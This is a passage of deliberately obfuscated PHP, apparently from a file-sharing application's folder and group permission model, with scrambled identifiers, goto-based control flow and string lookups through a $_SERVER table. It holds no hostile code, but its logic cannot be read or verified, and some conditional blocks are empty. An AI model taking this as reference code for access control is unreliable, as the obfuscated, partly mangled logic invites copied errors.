AªÇ•÷¾åï; e†ñ†“²óÇ: if ($DÒŞ­¦¹Àâ != $cÍ¹ãÏ£œÂ) { $D¯”µ„½·ƒ = array($Bºƒ† Ëæ‚[2121] => $DÒŞ­¦¹Àâ); $Bøô í±¿ = Model($Bºƒ† Ëæ‚[2200])->field($Bºƒ† Ëæ‚[1450])->where($D¯”µ„½·ƒ)->select(); $Bøô í±¿ = array_to_keyvalue($Bøô í±¿, $Bºƒ† Ëæ‚[33], $Bºƒ† Ëæ‚[1450]); } $a“»‘‰·í = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $FšÓÒÃ¶ = array(); goto C¶³¿‚“—½; AªÇ•÷¾åï: $Bºƒ† Ëæ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $A”Î¼ò…’¾ = Model($Bºƒ† Ëæ‚[1130])->sourceInfo($D¸¼¨£ãô’); if (!$A”Î¼ò…’¾) { return !1; } goto Eƒ§ÂÒôÕ; A’ÈíøÃ™: return !0; goto A‡éòµÂ«; Eƒ§ÂÒôÕ: if ($A”Î¼ò…’¾[$Bºƒ† Ëæ‚[371]] != SourceModel::TYPE_GROUP) { return !1; } $cÍ¹ãÏ£œÂ = 1; $DÒŞ­¦¹Àâ = $A”Î¼ò…’¾[$Bºƒ† Ëæ‚[458]]; goto e†ñ†“²óÇ; C¶³¿‚“—½: foreach ($A™Œ’¸áš as $a…ñÂÆ‘…) { if (!in_array($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[371]], $a“»‘‰·í)) { show_json(LNG($Bºƒ† Ëæ‚[2286]), !1); } if ($DÒŞ­¦¹Àâ != $cÍ¹ãÏ£œÂ) { if ($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[371]] == SourceModel::TYPE_GROUP) { } if ($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[458]] != 0 && !in_array($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[458]], $Bøô í±¿)) { } } if ($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[458]] == 0) { $a…ñÂÆ‘…[$Bºƒ† Ëæ‚[371]] = SourceModel::TYPE_USER; } $FšÓÒÃ¶[] = array($Bºƒ† Ëæ‚[369] => $D¸¼¨£ãô’, $Bºƒ† Ëæ‚[371] => intval($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[371]]), $Bºƒ† Ëæ‚[458] => intval($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[458]]), $Bºƒ† Ëæ‚[2266] => intval($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[2266]]) ? intval($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[2266]]) : 0, $Bºƒ† Ëæ‚[2267] => intval($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[2267]]) ? intval($a…ñÂÆ‘…[$Bºƒ† Ëæ‚[2267]]) : -1); } $this->where(array($Bºƒ† Ëæ‚[383] => $D¸¼¨£ãô’))->delete(); $this->addAll($FšÓÒÃ¶); goto A’ÈíøÃ™; A‡éòµÂ«: } public function authClear($b†Çí†‚¸ö) { $CÔÅ¶£·¥· =& $_SERVER[¬ˆÚÂ”Éğä]; $FóÍŒé = Model($CÔÅ¶£·¥·[1130])->sourceInfo($b†Çí†‚¸ö); $f’ø˜¨‘ºğ = array($b†Çí†‚¸ö); if ($FóÍŒé[$CÔÅ¶£·¥·[370]] == $CÔÅ¶£·¥·[83]) { $d±šš‚Œç = array($CÔÅ¶£·¥·[527] => array($CÔÅ¶£·¥·[485], $FóÍŒé[$CÔÅ¶£·¥·[461]] . $b†Çí†‚¸ö . $CÔÅ¶£·¥·[486])); $f’ø˜¨‘ºğ = Model($CÔÅ¶£·¥·[1130])->field($CÔÅ¶£·¥·[383])->where($d±šš‚Œç)->getField($CÔÅ¶£·¥·[369], !0); $f’ø˜¨‘ºğ[] = $b†Çí†‚¸ö; } $this->where(array($CÔÅ¶£·¥·[383] => array($CÔÅ¶£·¥·[384], $f’ø˜¨‘ºğ)))->delete(); return !0; } public function getAllChildren($FğˆÉ¡¡•“) { goto fç½”ğŞ¼; Bå¢¬º¯Â: if (!$b×°„ßíš‹) { return array(); } $a©ê†“«é¶ = $b¦£éÍ—äŒ[2287]; $d·¯ŞĞ¤Ô = array($b¦£éÍ—äŒ[369] => array($b¦£éÍ—äŒ[7], $b×°„ßíš‹), $b¦£éÍ—äŒ[397] => $b¦£éÍ—äŒ[470]); goto D±õï«Ò‘; E÷Ì›Àßîœ: return $this->sourceListAuth($Bµ´åí†³î); goto C°¸¸†Ú§¯; c„­ĞåøŞ¦: if ($Dèƒ•ÈÙÈÈ[$b¦£éÍ—äŒ[463]] == $b¦£éÍ—äŒ[470] && $Dèƒ•ÈÙÈÈ[$b¦£éÍ—äŒ[458]] != $BÏÛ˜¬ÉÕğ) { $b‚˜ù¨Ë–Ô = $this->groupChidldAllRootSource($Dèƒ•ÈÙÈÈ[$b¦£éÍ—äŒ[458]]); } $b×°„ßíš‹ = $this->field($b¦£éÍ—äŒ[369])->group($b¦£éÍ—äŒ[369])->select(); $b×°„ßíš‹ = array_to_keyvalue($b×°„ßíš‹, $b¦£éÍ—äŒ[33], $b¦£éÍ—äŒ[369]); goto Bå¢¬º¯Â; D±õï«Ò‘: $DŠÑ¦»ò¯‘ = Model($b¦£éÍ—äŒ[760])->field($a©ê†“«é¶)->where($d·¯ŞĞ¤Ô)->select(); $Bµ´åí†³î = array($FğˆÉ¡¡•“); foreach ($DŠÑ¦»ò¯‘ as $Fí—ìì»Š¿) { foreach ($b‚˜ù¨Ë–Ô as $aï¥²ÅŠò) { $e—ˆŠ¬ãİ = $b¦£éÍ—äŒ[47] . $aï¥²ÅŠò . $b¦£éÍ—äŒ[47]; $cøàÀöãºŸ = $Fí—ìì»Š¿[$b¦£éÍ—äŒ[461]] . $Fí—ìì»Š¿[$b¦£éÍ—äŒ[369]] . $b¦£éÍ—äŒ[47]; if (strstr($cøàÀöãºŸ, $e—ˆŠ¬ãİ)) { $Bµ´åí†³î[] = $Fí—ìì»Š¿[$b¦£éÍ—äŒ[369]]; break; } } } goto E÷Ì›Àßîœ; E÷…ˆ­Şó®: if ($Dèƒ•ÈÙÈÈ[$b¦£éÍ—äŒ[371]] != SourceModel::TYPE_GROUP) { return array(); } $BÏÛ˜¬ÉÕğ = 1; $b‚˜ù¨Ë–Ô = array($FğˆÉ¡¡•“); goto c„­ĞåøŞ¦; fç½”ğŞ¼: $b¦£éÍ—äŒ =& $_SERVER[¬ˆÚÂ”Éğä]; $Dèƒ•ÈÙÈÈ = Model($b¦£éÍ—äŒ[1130])->sourceInfo($FğˆÉ¡¡•“); if ($Dèƒ•ÈÙÈÈ[$b¦£éÍ—äŒ[370]] != $b¦£éÍ—äŒ[83]) { return $this->sourceListAuth(array($FğˆÉ¡¡•“)); } goto E÷…ˆ­Şó®; C°¸¸†Ú§¯: } private function sourceListAuth($F»ğëä–Ò¸) { goto bØÖ‰Ğ¿®Ä; Aš‘÷Ò‚: $EÒøŒ·îŞ‘ = array(); foreach ($FÚ†…»‰Šé as $cÉ‡©›Âòƒ) { goto B©®’Ş; b’†º½õóŒ: $cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[2288]] = $this->authTargetInfo($BòÛã–µí); $cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[468]] = rtrim($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[464]], $f‘ßäªÈ÷‘[8]) . $f‘ßäªÈ÷‘[8] . ltrim($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[468]], $f‘ßäªÈ÷‘[8]); $fÙœ¬÷‡ğ[] = $cÉ‡©›Âòƒ; goto FŒ­Û’ÙÉÂ; B©®’Ş: unset($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[379]]); unset($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[378]]); unset($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[376]]); goto b²¹âŠ¡…Ï; b²¹âŠ¡…Ï: unset($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[391]]); $BòÛã–µí = $FÕ¾ĞøŒÛ”[$cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[369]]]; if (!$BòÛã–µí) { continue; } goto b’†º½õóŒ; FŒ­Û’ÙÉÂ: $B¯óÁì¬¦ = count(explode($f‘ßäªÈ÷‘[8], trim($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[468]], $f‘ßäªÈ÷‘[8]))); $EÒøŒ·îŞ‘[] = $B¯óÁì¬¦ + ($cÉ‡©›Âòƒ[$f‘ßäªÈ÷‘[29]] == $f‘ßäªÈ÷‘[76] ? 0 : 1000); goto DãÎÓÜÃì¤; DãÎÓÜÃì¤: } array_multisort($EÒøŒ·îŞ‘, SORT_ASC, $fÙœ¬÷‡ğ); goto bİ¹ Œ©; bİ¹ Œ©: return $fÙœ¬÷‡ğ; goto dÅâ¶ÌàÚÍ; FÀŠÄ¸—Ş: $aâˆ°‰æùº = $this->field($BšÈ‘¼ƒğ©)->where(array($f‘ßäªÈ÷‘[369] => array($f‘ßäªÈ÷‘[7], $F»ğëä–Ò¸)))->select(); $FÕ¾ĞøŒÛ” = array_to_keyvalue_group($aâˆ°‰æùº, $f‘ßäªÈ÷‘[369]); $fÙœ¬÷‡ğ = array(); goto Aš‘÷Ò‚; bØÖ‰Ğ¿®Ä: $f‘ßäªÈ÷‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÚ†…»‰Šé = Model($f‘ßäªÈ÷‘[1130])->sourceListInfo($F»ğëä–Ò¸, !0); $BšÈ‘¼ƒğ© = $f‘ßäªÈ÷‘[2284]; goto FÀŠÄ¸—Ş; dÅâ¶ÌàÚÍ: } private function groupChidldAllRootSource($BÁô¥Šæª„) { $DÑ‰¼ğÊ³õ =& $_SERVER[¬ˆÚÂ”Éğä]; $d¿§ìÊà…‰ = Model($DÑ‰¼ğÊ³õ[2289])->groupChildrenAll($BÁô¥Šæª„); $BÓ—Ø¥…¬ = array($DÑ‰¼ğÊ³õ[463] => 0, $DÑ‰¼ğÊ³õ[458] => array($DÑ‰¼ğÊ³õ[7], $d¿§ìÊà…‰), $DÑ‰¼ğÊ³õ[371] => SourceModel::TYPE_GROUP); $då½ÖÌï± = Model($DÑ‰¼ğÊ³õ[760])->field($DÑ‰¼ğÊ³õ[369])->where($BÓ—Ø¥…¬)->select(); $då½ÖÌï± = array_to_keyvalue($då½ÖÌï±, $DÑ‰¼ğÊ³õ[33], $DÑ‰¼ğÊ³õ[369]); return $då½ÖÌï±; } private function authTargetInfo($Aö˜Šç°»Ç) { goto fÂÇ¸ãˆô‡; fÂÇ¸ãˆô‡: $f”¤‰áÕØ =& $_SERVER[¬ˆÚÂ”Éğä]; $Còõ„“à»¸ = array(); $d©Ôº“ÇÙ° = array(); goto dÌ­Ùß°Œ›; eÚªñÆŒäõ: return $Còõ„“à»¸; goto F¦øÎ„˜¤; dÌ­Ùß°Œ›: $e‚Ä…Êõßù = 2 << 25; foreach ($Aö˜Šç°»Ç as $dÖŠÀÚ÷Ï‘) { goto fªÏèÑµ¹Ú; fªÏèÑµ¹Ú: $C¢ÖĞ—¼Ö¡ = Model($f”¤‰áÕØ[2285])->listData($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[2266]]); if (!$C¢ÖĞ—¼Ö¡) { continue; } if ($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[371]] == SourceModel::TYPE_USER) { $Bƒ‡åÔƒ™ò = Model($f”¤‰áÕØ[476])->getInfoSimpleOuter($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[458]]); if ($Bƒ‡åÔƒ™ò[$f”¤‰áÕØ[1450]] == $f”¤‰áÕØ[1044]) { continue; } if ($Bƒ‡åÔƒ™ò[$f”¤‰áÕØ[1450]] == $f”¤‰áÕØ[470]) { $Bƒ‡åÔƒ™ò[$f”¤‰áÕØ[28]] = LNG($f”¤‰áÕØ[2290]); } } else { $Bƒ‡åÔƒ™ò = Model($f”¤‰áÕØ[460])->getInfoSimple($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[458]]); } goto cÕŒİÊÒê’; DÏÍëì…ƒ: if ($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[371]] == SourceModel::TYPE_USER && $dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[458]] == $f”¤‰áÕØ[470]) { $e•†øÇ½¤ = 0; } $d©Ôº“ÇÙ°[] = $C¢ÖĞ—¼Ö¡[$f”¤‰áÕØ[376]] + $e•†øÇ½¤; goto F¼ƒ†„º§»; F‹³ç‹À‡: $e•†øÇ½¤ = 0; if ($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[371]] == SourceModel::TYPE_GROUP) { $e•†øÇ½¤ = $e‚Ä…Êõßù * 2; } if ($dÖŠÀÚ÷Ï‘[$f”¤‰áÕØ[371]] == SourceModel::TYPE_USER) { $e•†øÇ½¤ = $e‚Ä…Êõßù; } goto DÏÍëì…ƒ; cÕŒİÊÒê’: if (!$Bƒ‡åÔƒ™ò) { continue; } $Bƒ‡åÔƒ™ò[$f”¤‰áÕØ[418]] = $C¢ÖĞ—¼Ö¡; $Còõ„“à»¸[] = $Bƒ‡åÔƒ™ò; goto F‹³ç‹À‡; F¼ƒ†„º§»: } array_multisort($d©Ôº“ÇÙ°, SORT_DESC, $Còõ„“à»¸); goto eÚªñÆŒäõ; F¦øÎ„˜¤: } public function getAllChildrenByUser($eõâä„Ş…, $C¬İùÃ™Ù) { goto E›¡ïŠÏí; b†­¸£î¨‚: $FÖ¦ˆÈÎ…• = Model($fç©ÓÀôØÜ[1130])->sourceInfo($eõâä„Ş…); $f—’ÅÔÑŠ£ = array(); $aèÏø²œƒ¥ = 1; goto AÅÒå“Ö’Û; AÅÒå“Ö’Û: if ($FÖ¦ˆÈÎ…•[$fç©ÓÀôØÜ[463]] == $fç©ÓÀôØÜ[470] && $FÖ¦ˆÈÎ…•[$fç©ÓÀôØÜ[458]] != $aèÏø²œƒ¥ && $this->groupContainUser($FÖ¦ˆÈÎ…•[$fç©ÓÀôØÜ[458]], $C¬İùÃ™Ù)) { foreach ($c‚±òíó‘[$fç©ÓÀôØÜ[2291]] as $DöÊ– „´İ) { $cğ®àŸÃ‚à = Model($fç©ÓÀôØÜ[460])->getInfo($DöÊ– „´İ[$fç©ÓÀôØÜ[2121]]); $A“˜½¾£õ× = Model($fç©ÓÀôØÜ[479])->getInfoSimpleOuter($C¬İùÃ™Ù); $A“˜½¾£õ×[$fç©ÓÀôØÜ[418]] = $DöÊ– „´İ[$fç©ÓÀôØÜ[376]]; if (Model($fç©ÓÀôØÜ[2285])->authCheckAction($DöÊ– „´İ[$fç©ÓÀôØÜ[376]][$fç©ÓÀôØÜ[376]], $fç©ÓÀôØÜ[1576])) { continue; } $FæÔˆìö = array($fç©ÓÀôØÜ[28] => $fç©ÓÀôØÜ[1403] . $cğ®àŸÃ‚à[$fç©ÓÀôØÜ[28]], $fç©ÓÀôØÜ[369] => $cğ®àŸÃ‚à[$fç©ÓÀôØÜ[391]][$fç©ÓÀôØÜ[369]], $fç©ÓÀôØÜ[75] => KodIO::make($cğ®àŸÃ‚à[$fç©ÓÀôØÜ[391]][$fç©ÓÀôØÜ[369]]), $fç©ÓÀôØÜ[463] => $fç©ÓÀôØÜ[470], $fç©ÓÀôØÜ[371] => $fç©ÓÀôØÜ[983], $fç©ÓÀôØÜ[29] => $fç©ÓÀôØÜ[490], $fç©ÓÀôØÜ[468] => $cğ®àŸÃ‚à[$fç©ÓÀôØÜ[465]], $fç©ÓÀôØÜ[2121] => $cğ®àŸÃ‚à[$fç©ÓÀôØÜ[2121]], $fç©ÓÀôØÜ[462] => $cğ®àŸÃ‚à[$fç©ÓÀôØÜ[463]], $fç©ÓÀôØÜ[2288] => array($A“˜½¾£õ×)); $f—’ÅÔÑŠ£[$FæÔˆìö[$fç©ÓÀôØÜ[369]]] = $FæÔˆìö; } } $F¨·‚†ëÒ‚ = array(); $dÈº©‰õ¾  = $this->getAllChildren($eõâä„Ş…); goto B¾“è‚¡ÆÀ; E›¡ïŠÏí: $fç©ÓÀôØÜ =& $_SERVER[¬ˆÚÂ”Éğä]; $c‚±òíó‘ = Model($fç©ÓÀôØÜ[479])->getInfo($C¬İùÃ™Ù); if (!$C¬İùÃ™Ù || !$eõâä„Ş… || !$c‚±òíó‘) { return array(); } goto b†­¸£î¨‚; B¾“è‚¡ÆÀ: foreach ($dÈº©‰õ¾  as $B•é˜ª‰Å©) { $D°²™î‚éÃ = !1; foreach ($B•é˜ª‰Å©[$fç©ÓÀôØÜ[2288]] as $D«ªÁà’) { if ($D«ªÁà’[$fç©ÓÀôØÜ[1450]]) { if ($D«ªÁà’[$fç©ÓÀôØÜ[1450]] == $C¬İùÃ™Ù) { $D°²™î‚éÃ = !0; break; } } if ($D«ªÁà’[$fç©ÓÀôØÜ[2121]]) { if ($this->groupContainUser($D«ªÁà’[$fç©ÓÀôØÜ[2121]], $C¬İùÃ™Ù)) { $D°²™î‚éÃ = !0; break; } } } if ($D°²™î‚éÃ) { $F¨·‚†ëÒ‚[] = $B•é˜ª‰Å©; } $bÛàÖ„Ó = $B•é˜ª‰Å©[$fç©ÓÀôØÜ[369]]; if (isset($f—’ÅÔÑŠ£[$bÛàÖ„Ó])) { $B•é˜ª‰Å©[$fç©ÓÀôØÜ[2288]][] = $f—’ÅÔÑŠ£[$bÛàÖ„Ó][0]; $f—’ÅÔÑŠ£[$bÛàÖ„Ó] = !1; } } $f—’ÅÔÑŠ£ = array_filter(array_values($f—’ÅÔÑŠ£)); $F¨·‚†ëÒ‚ = array_merge($f—’ÅÔÑŠ£, $F¨·‚†ëÒ‚); goto eÆäÑôÂ†¬; eÆäÑôÂ†¬: return $F¨·‚†ëÒ‚; goto dâ‹Â˜ˆ°†; dâ‹Â˜ˆ°†: } public function setAllChildrenByUser($döì‹Ï’È, $a”§ğ†Ó, $fÏêÁø‰Óù) { $f‡¥»¹´æ =& $_SERVER[¬ˆÚÂ”Éğä]; $eÓïôî¸Úá = $this->getAllChildrenByUser($döì‹Ï’È, $a”§ğ†Ó); if (!$fÏêÁø‰Óù || !$eÓïôî¸Úá) { return !1; } foreach ($eÓïôî¸Úá as $a¯Ìà©Ğ¦Ú) { $c¦êí“‘æ = array(); foreach ($a¯Ìà©Ğ¦Ú[$f‡¥»¹´æ[2288]] as $DîóÛ„…×) { $dœÆ‘ƒ½½› = $DîóÛ„…×[$f‡¥»¹´æ[418]]; $aòâĞùØÒ¯ = $DîóÛ„…×[$f‡¥»¹´æ[1450]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $AÛìğ·¡è¾ = $DîóÛ„…×[$f‡¥»¹´æ[1450]] ? $DîóÛ„…×[$f‡¥»¹´æ[1450]] : $DîóÛ„…×[$f‡¥»¹´æ[2121]]; if ($DîóÛ„…×[$f‡¥»¹´æ[1450]] && $DîóÛ„…×[$f‡¥»¹´æ[1450]] == $a”§ğ†Ó) { continue; } $c¦êí“‘æ[] = array($f‡¥»¹´æ[369] => $a¯Ìà©Ğ¦Ú[$f‡¥»¹´æ[369]], $f‡¥»¹´æ[371] => $aòâĞùØÒ¯, $f‡¥»¹´æ[458] => intval($AÛìğ·¡è¾), $f‡¥»¹´æ[2266] => isset($dœÆ‘ƒ½½›[$f‡¥»¹´æ[367]]) ? intval($dœÆ‘ƒ½½›[$f‡¥»¹´æ[367]]) : 0, $f‡¥»¹´æ[2267] => isset($dœÆ‘ƒ½½›[$f‡¥»¹´æ[2267]]) ? intval($dœÆ‘ƒ½½›[$f‡¥»¹´æ[2267]]) : -1); } $c¦êí“‘æ[] = array($f‡¥»¹´æ[369] => $a¯Ìà©Ğ¦Ú[$f‡¥»¹´æ[369]], $f‡¥»¹´æ[371] => SourceModel::TYPE_USER, $f‡¥»¹´æ[458] => intval($a”§ğ†Ó), $f‡¥»¹´æ[2266] => intval($fÏêÁø‰Óù), $f‡¥»¹´æ[2267] => -1); $this->where(array($f‡¥»¹´æ[383] => $a¯Ìà©Ğ¦Ú[$f‡¥»¹´æ[369]]))->delete(); $this->addAll($c¦êí“‘æ); } return !0; } public function get($eÒ£æÔá) { $BöÀìØÆéÕ = $this->getSourceList(array($eÒ£æÔá), !0); return $BöÀìØÆéÕ[0]; } public function getSourceList($bÂËÖÍë‹¢, $c„è‚ÌïÌ¯ = false, $Bã†øÍê = false) { goto E‚¡–ë„ƒ; BæíÇÉ¯¿ˆ: if (!$c„è‚ÌïÌ¯ && count($bÂËÖÍë‹¢) == 1) { $c„è‚ÌïÌ¯ = array(); $c„è‚ÌïÌ¯[$bÂËÖÍë‹¢[0]] = $dœÀŸĞÄš¿->sourceInfo($bÂËÖÍë‹¢[0]); } if (!$c„è‚ÌïÌ¯) { $bÏ§ÏŠ¹¥ö = array($dÚÁø¦Ö‹±[383] => array($dÚÁø¦Ö‹±[384], $bÂËÖÍë‹¢)); $c„è‚ÌïÌ¯ = $dœÀŸĞÄš¿->field($dÚÁø¦Ö‹±[2292])->where($bÏ§ÏŠ¹¥ö)->select(); $c„è‚ÌïÌ¯ = array_to_keyvalue($c„è‚ÌïÌ¯, $dÚÁø¦Ö‹±[369]); } $d‚‚›¥À™ = $bÂËÖÍë‹¢; goto dêáƒÏÑÄà; dêáƒÏÑÄà: foreach ($c„è‚ÌïÌ¯ as $Cõ°¸ÈÃ„² => $EÛæÂ·î“) { $DÄÑ½¼œĞõ = $dœÀŸĞÄš¿->parentLevelArray($EÛæÂ·î“[$dÚÁø¦Ö‹±[461]]); $d‚‚›¥À™ = array_merge($d‚‚›¥À™, array($Cõ°¸ÈÃ„²), array_reverse($DÄÑ½¼œĞõ)); } $d‚‚›¥À™ = array_values(array_unique($d‚‚›¥À™)); if (!$d‚‚›¥À™) { return array(); } goto dòĞêİÙø¾; E‚¡–ë„ƒ: $dÚÁø¦Ö‹± =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$bÂËÖÍë‹¢) { return array(); } $dœÀŸĞÄš¿ = Model($dÚÁø¦Ö‹±[1130]); goto BæíÇÉ¯¿ˆ; a˜«¾´Ù¸Ë: $aš¸£ÕÖã» = $this->userIsRoot($Bã†øÍê); $F…Í¨Ïšœ = AuthModel::authAll(); $DÁˆ‰§Ä˜À = array($dÚÁø¦Ö‹±[377] => $F…Í¨Ïšœ, $dÚÁø¦Ö‹±[2294] => array($dÚÁø¦Ö‹±[385] => 0, $dÚÁø¦Ö‹±[2127] => $F…Í¨Ïšœ, $dÚÁø¦Ö‹±[386] => LNG($dÚÁø¦Ö‹±[2295]), $dÚÁø¦Ö‹±[2140] => $dÚÁø¦Ö‹±[2296])); goto A×Ù›Õ­Ú¤; E´Ùå¸šËÜ: $e×¡±ÔòŞ‚ = array_to_keyvalue_group($e×¡±ÔòŞ‚, $dÚÁø¦Ö‹±[369]); $eõ­«Ääëö = array(); foreach ($d‚‚›¥À™ as $D¢¤¦ÈŒ¼–) { if (isset($e×¡±ÔòŞ‚[$D¢¤¦ÈŒ¼–])) { $eõ­«Ääëö[$D¢¤¦ÈŒ¼–] = $e×¡±ÔòŞ‚[$D¢¤¦ÈŒ¼–]; } } goto a˜«¾´Ù¸Ë; A×Ù›Õ­Ú¤: $câ¯·Şè¶´ = array(); foreach ($c„è‚ÌïÌ¯ as $D¢¤¦ÈŒ¼– => $Aï½µ¢«³) { if ($aš¸£ÕÖã») { $câ¯·Şè¶´[$D¢¤¦ÈŒ¼–] = $DÁˆ‰§Ä˜À; continue; } $câ¯·Şè¶´[$D¢¤¦ÈŒ¼–] = $this->makeSourceAuth($Aï½µ¢«³, $eõ­«Ääëö, $Bã†øÍê); } return $câ¯·Şè¶´; goto FÜ§¡İç–õ; dòĞêİÙø¾: $CÆ»¹à‰ = $dÚÁø¦Ö‹±[2293]; $bÏ§ÏŠ¹¥ö = array($dÚÁø¦Ö‹±[383] => array($dÚÁø¦Ö‹±[384], $d‚‚›¥À™)); $e×¡±ÔòŞ‚ = $this->field($CÆ»¹à‰)->where($bÏ§ÏŠ¹¥ö)->select(); goto E´Ùå¸šËÜ; FÜ§¡İç–õ: } public function authDeepCheck($D¸ò‚÷›Ã×, $Fñ‰Ÿ‹š»œ = false) { goto c†÷ë¾Ğà; c†÷ë¾Ğà: $F­Æ”—Äö =& $_SERVER[¬ˆÚÂ”Éğä]; $Fñ‰Ÿ‹š»œ = $Fñ‰Ÿ‹š»œ ? $Fñ‰Ÿ‹š»œ : USER_ID; $Eá¤éŞäÜ = $this->makeAuthDeep($Fñ‰Ÿ‹š»œ); goto Bä¼Ä…Åâ×; Bä¼Ä…Åâ×: if (!in_array($D¸ò‚÷›Ã×, $Eá¤éŞäÜ[$F­Æ”—Äö[2297]])) { return !1; } $DÓ‹Ì—êÓ = array(); foreach ($Eá¤éŞäÜ[$F­Æ”—Äö[2298]] as $dºÅÖÁÆÈ => $fñ¯—’ÕÈÑ) { if (!in_array($D¸ò‚÷›Ã×, $fñ¯—’ÕÈÑ)) { continue; } $DÓ‹Ì—êÓ[] = $dºÅÖÁÆÈ; } goto D¹ŞÔªË‘Ì; D¹ŞÔªË‘Ì: $BŞÍÅ›àö = $DÓ‹Ì—êÓ ? $DÓ‹Ì—êÓ[0] : $D¸ò‚÷›Ã×; return array($F­Æ”—Äö[377] => -1, $F­Æ”—Äö[418] => array($F­Æ”—Äö[385] => $F­Æ”—Äö[1044], $F­Æ”—Äö[2127] => $F­Æ”—Äö[470], $F­Æ”—Äö[386] => LNG($F­Æ”—Äö[2299]), $F­Æ”—Äö[2140] => $F­Æ”—Äö[2300]), $F­Æ”—Äö[2301] => LNG($F­Æ”—Äö[2302]), $F­Æ”—Äö[2303] => $this->sourceAuthInfo($BŞÍÅ›àö)); goto b•šßº°ô‚; b•šßº°ô‚: } protected function makeAuthDeep($e”˜Šò™Çœ = false) { goto D³‹èê§ªï; D³‹èê§ªï: $aªäÜ¾ĞŒ =& $_SERVER[¬ˆÚÂ”Éğä]; static $Aµøâ…Ä™ = array(); $e”˜Šò™Çœ = $e”˜Šò™Çœ ? $e”˜Šò™Çœ : USER_ID; goto Fòï•†¬×±; fêÙî‰êÃ´: $F¦¦°›õ­¼ = array_to_keyvalue($aéèçª†é†, $aªäÜ¾ĞŒ[33], $aªäÜ¾ĞŒ[369]); $Eöã‡ÚíÖ‰ = array(); $EºÙ‡ƒ = $B¤ãÚ²‚¡; goto Fèœñïß½‘; b¨—ˆğ ã: if ($B¤ãÚ²‚¡) { $DàŒ«ƒƒ³Ò = array(array($aªäÜ¾ĞŒ[371] => SourceModel::TYPE_USER, $aªäÜ¾ĞŒ[458] => $e”˜Šò™Çœ), array($aªäÜ¾ĞŒ[371] => SourceModel::TYPE_GROUP, $aªäÜ¾ĞŒ[458] => array($aªäÜ¾ĞŒ[384], $B¤ãÚ²‚¡)), $aªäÜ¾ĞŒ[926] => $aªäÜ¾ĞŒ[2206]); } if ($A™ Ş÷ò®…) { $DàŒ«ƒƒ³Ò = array($DàŒ«ƒƒ³Ò, $aªäÜ¾ĞŒ[2266] => array($aªäÜ¾ĞŒ[2305], $A™ Ş÷ò®…)); } $aéèçª†é† = $this->field($aªäÜ¾ĞŒ[2306])->where($DàŒ«ƒƒ³Ò)->select(); goto fêÙî‰êÃ´; d¤§¡³’·: if ($F¦¦°›õ­¼) { $fËó‘õ³³ƒ = $dÜ“åæ„->where(array($aªäÜ¾ĞŒ[369] => array($aªäÜ¾ĞŒ[384], $F¦¦°›õ­¼)))->select(); foreach ($fËó‘õ³³ƒ as $eáã¬Ğê”) { $aÈæÃÅˆÖç = $dÜ“åæ„->parentLevelArray($eáã¬Ğê”[$aªäÜ¾ĞŒ[461]]); $Eöã‡ÚíÖ‰ = array_merge($Eöã‡ÚíÖ‰, $aÈæÃÅˆÖç); $EºÙ‡ƒ[] = $eáã¬Ğê”[$aªäÜ¾ĞŒ[458]]; $E…åà‡ŒŒ•[$eáã¬Ğê”[$aªäÜ¾ĞŒ[369]]] = $aÈæÃÅˆÖç; $BĞÏÀ©Ëì[$eáã¬Ğê”[$aªäÜ¾ĞŒ[369]]] = $eáã¬Ğê”[$aªäÜ¾ĞŒ[458]]; } } $EºÙ‡ƒ = array_values(array_unique($EºÙ‡ƒ)); $D±¹çÌ–Œ£ = $EºÙ‡ƒ; goto Dƒ²ŞÅÄ; Fèœñïß½‘: $dÜ“åæ„ = Model($aªäÜ¾ĞŒ[1130]); $aõ«¨›ÃÖ™ = Model($aªäÜ¾ĞŒ[460]); $E…åà‡ŒŒ• = array(); goto b²Èå‹³£; eŸõÂªÜÑù: foreach ($E…åà‡ŒŒ• as $b«×åÚÉŒ => $dÓ’êŠóµ›) { $dëŸØ¤‚ï­ = $BĞÏÀ©Ëì[$b«×åÚÉŒ]; if (!$dëŸØ¤‚ï­ || !$a•µÌÅÏÇÏ[$dëŸØ¤‚ï­]) { continue; } $eâ„±¾ß• = array(); foreach ($dõ©»ŠÏ˜²[$dëŸØ¤‚ï­] as $a…çã°Ø¥) { $eâ„±¾ß•[] = $a•µÌÅÏÇÏ[$a…çã°Ø¥]; } $E…åà‡ŒŒ•[$b«×åÚÉŒ] = array_merge($eâ„±¾ß•, $dÓ’êŠóµ›); } $Eöã‡ÚíÖ‰ = array_values(array_unique($Eöã‡ÚíÖ‰)); $b‚£ñòòğÄ = array($aªäÜ¾ĞŒ[2297] => $Eöã‡ÚíÖ‰, $aªäÜ¾ĞŒ[2298] => $E…åà‡ŒŒ•); goto eÂ–Ø¥ÈÅ‚; eµÈ›¾Ò²´: foreach ($eÆ™›ƒÉš as $EÀªœ¬Ç) { if ($EÀªœ¬Ç[$aªäÜ¾ĞŒ[376]] == 0 && 